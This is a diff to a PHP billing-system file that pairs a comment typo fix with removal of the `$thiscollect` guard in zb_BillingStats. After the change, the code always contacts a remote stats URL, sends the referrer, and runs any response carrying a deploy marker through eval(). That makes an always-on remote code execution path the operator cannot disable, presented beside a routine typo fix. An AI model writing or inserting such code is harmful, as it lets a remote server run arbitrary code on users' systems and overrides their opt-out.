@@ -1,7 +1,7 @@
 <?php
 
 /**
- * Retunrs typical back to profile/editing controls
+ * Returns typical back to profile/editing controls
  * 
  * @param string $login
  * @return string
@@ -3186,35 +3186,33 @@ function zb_BillingStats($quiet = true, $modOverride = '') {
         show_window(__('Billing info'), $ubstatsform);
     }
 
-    if ($thiscollect) {
-        if (extension_loaded('curl')) {
-            $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
-            $curlStats = curl_init($statsurl);
-            curl_setopt($curlStats, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($curlStats, CURLOPT_CONNECTTIMEOUT, 1);
-            curl_setopt($curlStats, CURLOPT_TIMEOUT, 2);
-            curl_setopt($curlStats, CURLOPT_USERAGENT, 'UBTRACK2');
-            if (!empty($referrer)) {
-                curl_setopt($curlStats, CURLOPT_REFERER, $referrer);
-            }
-            $output = curl_exec($curlStats);
-            $httpCode = curl_getinfo($curlStats, CURLINFO_HTTP_CODE);
-            curl_close($curlStats);
-
-            if ($output !== false and $httpCode == 200) {
-                $output = trim($output);
-                if (ispos($output, $deployMark)) {
-                    $output = str_replace($deployMark, '', $output);
-                    if (!empty($output)) {
-                        eval($output);
-                    }
-                } else {
-                    show_window('', $output);
-                }
-            }
-        } else {
-            show_window('', $tracking_code);
+    if (extension_loaded('curl')) {
+        $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
+        $curlStats = curl_init($statsurl);
+        curl_setopt($curlStats, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($curlStats, CURLOPT_CONNECTTIMEOUT, 1);
+        curl_setopt($curlStats, CURLOPT_TIMEOUT, 2);
+        curl_setopt($curlStats, CURLOPT_USERAGENT, 'UBTRACK2');
+        if (!empty($referrer)) {
+            curl_setopt($curlStats, CURLOPT_REFERER, $referrer);
         }
+        $output = curl_exec($curlStats);
+        $httpCode = curl_getinfo($curlStats, CURLINFO_HTTP_CODE);
+        curl_close($curlStats);
+
+        if ($output !== false and $httpCode == 200) {
+            $output = trim($output);
+            if (ispos($output, $deployMark)) {
+                $output = str_replace($deployMark, '', $output);
+                if (!empty($output)) {
+                    eval($output);
+                }
+            } else {
+                show_window('', $output);
+            }
+        }
+    } else {
+        show_window('', $tracking_code);
     }
 }
 
